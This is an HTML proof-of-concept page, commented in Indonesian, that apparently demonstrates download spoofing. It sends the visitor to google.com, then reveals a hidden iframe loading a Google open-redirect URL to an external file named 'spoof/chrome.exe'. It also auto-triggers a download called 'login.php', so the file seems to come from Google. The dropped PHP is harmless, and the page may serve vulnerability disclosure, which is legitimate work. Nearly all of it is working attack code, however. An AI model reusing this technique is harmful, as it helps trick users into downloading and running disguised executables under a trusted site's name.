<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC - Download Dialog After Google</title>
</head>
<body>
  <div id="content">
    <h1>Step 1: Klik untuk pergi ke Google.com</h1>
    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan setelahnya, dialog download akan muncul:</p>
    
    <!-- Tombol untuk mengarahkan ke Google.com -->
    <button onclick="redirectToGoogle()">Go to Google.com</button>

    <!-- Iframe (akan muncul setelah redirect) -->
    <div style="margin-top: 20px;">
      <iframe 
        id="iframeExample" 
        src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
        width="600" 
        height="300" 
        style="border: 1px solid #ccc; display: none;">
      </iframe>
    </div>
  </div>

  <script>
    function redirectToGoogle() {
      // Redirect ke Google.com di tab yang sama
      window.location.href = "https://www.google.com";

      // Tunggu 2 detik setelah pengalihan, baru muncul iframe dan trigger download
      setTimeout(function() {
        // Tampilkan iframe setelah pengalihan ke Google
        const iframe = document.getElementById('iframeExample');
        iframe.style.display = "block";  // Menampilkan iframe
        
        // Trigger dialog download
        triggerDownload();
      }, 2000);  // Delay 2 detik setelah redirect ke Google.com
    }

    function triggerDownload() {
      // File PHP yang akan diunduh
      const php = `<?php
echo "wkwkwk ini file php bebas ðŸ˜";
?>`;

      const blob = new Blob([php], { type: "application/php" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "login.php";
      a.click();  // Trigger download
    }
  </script>
</body>
</html>
